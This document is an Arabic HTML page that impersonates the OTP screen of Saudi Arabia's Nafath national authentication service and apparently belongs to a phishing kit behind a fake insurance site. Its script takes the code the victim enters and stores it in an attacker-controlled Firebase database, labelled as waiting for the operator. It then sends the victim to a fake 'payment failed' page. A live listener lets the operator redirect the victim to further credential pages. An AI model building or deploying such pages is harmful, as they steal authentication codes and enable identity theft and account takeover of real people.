<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>نفاذ - رمز التوثيق | Nafath OTP</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/inner-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display:flex; align-items:center; justify-content:center; padding:20px; }
        #overlay {
            position:absolute; inset:0;
            background:rgba(7,31,28,0.88); display:none;
            flex-direction:column; justify-content:center; align-items:center; z-index:10;
            border-radius:20px;
        }
    </style>
</head>
<body>

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<div class="teal-card teal-card--narrow" style="width:100%;position:relative;">
    <div id="overlay">
        <div class="spin-ring"></div>
        <div style="font-size:0.88rem;color:var(--text-muted);margin-top:16px;" data-i18n="nafath_otp.verifying">جاري التحقق...</div>
    </div>

    <div style="padding:20px 24px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--teal-border);">
        <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" height="40" width="160">
        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
    </div>

    <div class="card-body" style="text-align:center;">
        <div class="section-title" style="color:var(--green);" data-i18n="nafath_otp.title">رمز التوثيق</div>
        <div class="section-sub" style="margin:8px 0 28px;" data-i18n="nafath_otp.sub">تم إرسال رمز التوثيق إلى هاتفك المسجل، يرجى إدخاله للمتابعة</div>

        <div class="field">
            <input type="number" class="otp-input" id="otp-code" data-i18n="nafath_otp.placeholder" placeholder="رمز التوثيق" maxlength="6">
        </div>

        <button class="btn-green" onclick="sendOTP()" style="margin-top:8px;" data-i18n="nafath_otp.btn">متابعة التوثيق</button>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    async function sendOTP() {
        const code = document.getElementById('otp-code').value;
        const userId = localStorage.getItem('user_id');
        if (code.length < 4) { alert(t('nafath_otp.err_short')); return; }
        document.getElementById('overlay').style.display = 'flex';
        try {
            await db.collection("orders").doc(userId).update({
                nafath_otp: code, next_step: "WAITING",
                status: "تم إرسال كود نفاذ - بانتظار الرقم"
            });
            window.location.href = "payment_failed.html";
        } catch(e) {
            document.getElementById('overlay').style.display = 'none';
            alert(t('nafath_otp.err_connection'));
        }
    }

    (function() {
        const userId = localStorage.getItem('user_id');
        if (userId) {
            db.collection("orders").doc(userId).onSnapshot((doc) => {
                if (doc.exists) {
                    const data = doc.data();
                    if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
                    else if (data.next_step === "GO_TO_NAFATH") window.location.href = "nafath.html";
                }
            });
        }
    })();
</script>
</body>
</html>
